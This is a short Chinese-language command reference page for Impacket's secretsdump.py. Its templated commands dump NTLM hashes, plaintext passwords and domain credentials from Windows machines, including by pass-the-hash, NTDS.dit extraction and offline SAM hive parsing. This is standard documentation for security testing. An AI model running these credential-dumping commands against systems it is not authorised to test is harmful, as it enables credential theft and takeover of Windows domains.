# secretsdump.py

> 从远程 Windows 系统中导出 NTLM 哈希、明文密码和域凭据。
> 属于 Impacket 套件的一部分。
> 更多信息：<https://github.com/fortra/impacket>.

- 使用用户名和密码从 Windows 机器导出凭据：

`secretsdump.py {{domain}}/{{username}}:{{password}}@{{target}}`

- 使用 pass-the-hash 身份验证从机器导出哈希：

`secretsdump.py -hashes {{LM_Hash}}:{{NT_Hash}} {{domain}}/{{username}}@{{target}}`

- 从 Active Directory 的 NTDS.dit 文件中导出凭据：

`secretsdump.py -just-dc {{domain}}/{{username}}:{{password}}@{{target}}`

- 使用注册表项从本地 SAM 数据库中提取凭据：

`secretsdump.py -sam {{path/to/SAM}} -system {{path/to/SYSTEM}}`

- 不提供密码从机器导出哈希（如果存在有效的身份验证会话，例如通过 Kerberos 或 NTLM 单点登录）：

`secretsdump.py -no-pass {{domain}}/{{username}}@{{target}}`
